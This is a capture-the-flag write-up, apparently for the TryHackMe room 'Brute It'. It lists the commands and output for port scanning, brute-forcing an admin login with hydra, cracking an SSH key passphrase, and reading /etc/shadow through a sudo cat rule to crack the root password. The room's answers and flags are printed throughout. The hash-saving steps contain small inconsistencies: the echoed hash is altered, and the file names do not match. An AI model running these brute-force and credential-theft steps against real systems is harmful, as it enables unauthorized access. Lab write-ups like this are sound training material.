---
custom_edit_url: null
---

## Task 1: About this box
### Deploy the machine
### No answer needed

&nbsp;

## Task 2: Reconnaissance
### Search for open ports using nmap. How many ports are open?

Let's perform a `nmap` scan against the machine.
```
$ nmap -sC -sV 10.10.30.186
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 08:43 IST
Nmap scan report for 10.10.30.186
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
```
As we can see there are two open ports:

| Port | Service  |
| :-: | :-: |
| 22 | ssh |
| 80 | http |
### Answer
```
2
```

&nbsp;

### What version of SSH is running?
The answer is present in the `nmap` scan,
### Answer
```
OpenSSH 7.6p1
```

&nbsp;

### What version of Apache is running?
The answer is in the `nmap` scan.
### Answer
```
2.4.29
```

&nbsp;

### Which Linux distribution is running?

The answer is in the `nmap` scan.
### Answer
```
Ubuntu
```

&nbsp;

### Search for hidden directories on web server. What is the hidden directory?
Let's brute force the web pages using `gobuster`.
```
$ gobuster dir -u http://10.10.30.186 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.30.186
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.30.186/admin/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
=============================================================== 
```
### Answer
```
/admin
```

&nbsp;

## Task 2: Getting a shell
### What is the user:password of the admin panel?

Let's go to the `admin/` directory.

![2](https://github.com/Knign/Write-ups/assets/110326359/37b68183-6329-49a4-9acf-f8aaed6cb39b)

We can check the source code using  `CTRL+U`.

![3](https://github.com/Knign/Write-ups/assets/110326359/c99d5669-21ec-4307-8060-88d15e86109d)

Now that we know the username, we can use `hydra` to brute force the password.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.30.186 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 09:48:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.30.186:80/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid
[80][http-post-form] host: 10.10.30.186   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 09:49:25
```
### Answer
```
admin:xavier
```

&nbsp;

### Crack the RSA key you found. What is John's RSA Private Key passphrase?
Let's login with `admin` as the username and `xavier` as the password.

![4](https://github.com/Knign/Write-ups/assets/110326359/8926dd22-3fbc-45c3-8f40-29f627bc8c2a)

Let's download the `RSA private key`. for the user `john`.
```
$ wget http://10.10.30.186/admin/panel/id_rsa
--2023-12-07 09:59:03--  http://10.10.30.186/admin/panel/id_rsa
Connecting to 10.10.30.186:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: ‘id_rsa’

id_rsa                                                     100%[========================================================================================================================================>]   1.72K  --.-KB/s    in 0s      

2023-12-07 09:59:04 (3.21 No error) - ‘id_rsa’ saved [1766/1766]
```
We can use `ssh2john` to create a hash file.
```
$ ssh2john id_rsa > id_hash 
```
Now we can use `john` to crack the hashes.
```
$ john id_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2023-12-07 10:04) 4.000g/s 290496p/s 290496c/s 290496C/s romeo23..renatito
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### Answer
```
rockinroll
```

&nbsp;

### user.txt
Let's change the permissions of the `id_rsa` file.
```
$ chmod 700 id_rsa 
```
Now that we know that the password for `john` is `rockinroll`, let's login through SSH.
```
$ ssh -i id_rsa john@10.10.30.186
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  7 04:40:36 UTC 2023

  System load:  0.0                Processes:           102
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 36%                IP address for eth0: 10.10.30.186
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
```
Let's read the `user.txt` file.
```
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```
### Answer
```
THM{a_password_is_not_a_barrier}
```

### Web flag
The web flag was present on the page with the RSA private key.
### Answer
```
THM{brut3_f0rce_is_e4sy}
```

&nbsp;

## Task 4: Privilege Escalation
### Find a form to escalate your privileges. What is the root's password?
Let's check what files `john` has the permission to execute.
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
So we can run `/bin/cat` as an elevated user. 

That means we can cat the `/etc/shadow` file.
```
john@bruteit:~$ sudo /bin/cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```
We can tell that the `root` user's password is hashed using SHA-512 by the `$6$` characters.
Let's save the `root` user's hash on our machine.
```
$ echo $6$zdk0jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6MJYPUTAaWu4infDjI88U9yUXEVgL > root_hash
```
We have to find the correct for SHA-512.

![5](https://github.com/Knign/Write-ups/assets/110326359/d9c4b88b-0258-47b3-b00a-3bf9bcbd6e60)

Let's run `hashcat` in order to crack this hash.
```
$ hashcat -a 0 -m 1800 root_hash.txt /usr/share/wordlists/rockyou.txt
```
### Answer
```
football
```

&nbsp;

### root.txt
Let's switch to the `root` user.
```
john@bruteit:~$ su root
Password: 
root@bruteit:/home/john# 
```
We can now read the `root.txt` file.
```
root@bruteit:/home/john# cd /root
root@bruteit:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
### Answer
```
THM{pr1v1l3g3_3sc4l4t10n}
```
